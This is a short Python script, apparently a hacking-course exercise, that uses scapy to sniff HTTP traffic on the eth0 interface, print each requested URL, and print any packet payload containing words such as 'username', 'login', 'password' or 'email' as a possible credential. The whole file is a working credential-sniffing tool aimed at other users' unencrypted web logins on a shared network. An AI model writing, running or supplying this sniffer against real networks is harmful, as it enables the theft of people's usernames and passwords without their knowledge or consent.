#!/usr/bin/env/python

import scapy.all as scapy
from scapy.layers import http



def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) #filter argument

def get_url(packet):
    url= packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
    return url

def get_username_passwords(packet):
    if packet.haslayer(scapy.Raw):
        load=packet[scapy.Raw].load # to print info --> packet[name_of_layer].field_name
        keywords=["username","login","user","password","pass","email"]
        for keyword in keywords:
            if keyword in load.decode():
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("[+]HTTP REQUEST >> "+url.decode())

        login_info=get_username_passwords(packet)
        if login_info:
            print("[+]Possible username/password > "+ login_info.decode() +"\n\n")



sniff("eth0")
